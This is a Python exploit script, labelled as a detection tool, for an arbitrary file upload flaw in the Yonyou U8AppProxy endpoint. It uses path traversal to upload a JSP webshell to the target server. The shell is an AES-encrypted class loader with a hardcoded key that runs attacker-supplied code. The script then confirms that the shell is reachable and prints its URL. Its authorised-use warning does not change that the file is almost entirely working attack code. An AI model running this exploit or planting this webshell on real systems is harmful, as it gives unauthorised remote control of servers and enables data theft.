#! python3

"""

@FileName: 用友 GRP-U8 U8AppProxy
@Author: londly
@Datetime: 20230316

"""
import argparse
from optparse import OptionParser
from urllib.parse import urljoin
import requests
import sys

from termcolor import cprint

requests.packages.urllib3.disable_warnings()

def banner():
    print('''
    ***************************************************************
    用友NC U8AppProxy 任意文件上传漏洞检测工具
    Author: londly
    First Date: 2023/03/18
    ***************************************************************
    
    *************************警 告*********************************
    本工具旨在帮助企业快速定位漏洞、修复漏洞，仅限授权安全测试使用！
    请严格遵守《中华人民共和国网络安全法》，禁止未授权非法攻击站点！
    ***************************************************************
    
    
    ''');

def main(url):
    print("[-]正在检测用友NC U8AppProxy是否存在任意文件上传漏洞")
    target = urljoin(url, "/U8AppProxy?gnid=myinfo&id=saveheader&zydm=../../hello_U8")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Edg/89.0.774.68",
        "Accept-Encoding": "gzip, deflate"
    }
    shell_content = '<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>'

    files = [('file', ('hello_U8.jsp', shell_content, 'application/octet-stream'))]
    response = requests.post(target, files=files, headers=headers, timeout=30, verify=False)
    webshell = urljoin(url, "hello_U8.jsp")
    response = requests.get(webshell, headers=headers, timeout=30, verify=False)
    if response.status_code == 200:
        print("[+] 存在NC_U8AppProxy任意文件上传漏洞，即将上传webshell")
        print("[+] 文件上传成功！")
        print("[+] webshell: " + webshell)
    if response.status_code == 403:
        print("[-] 文件上传成功，但访问被拦截！")


def _init():
    global url
    banner()
    usage = '\n\t' \
            'python3 %prog -u domain.com\n\t' \

    parse = OptionParser(usage=usage)
    parse.add_option('-u', '--url', dest='url', type='string', help='target url')
    options, args = parse.parse_args()
    url = options.url
    if url:
        main(url)

if __name__ == '__main__':

    _init()


        # if (args.check_file):
        #     multithreading(main, args.check_file, 8)
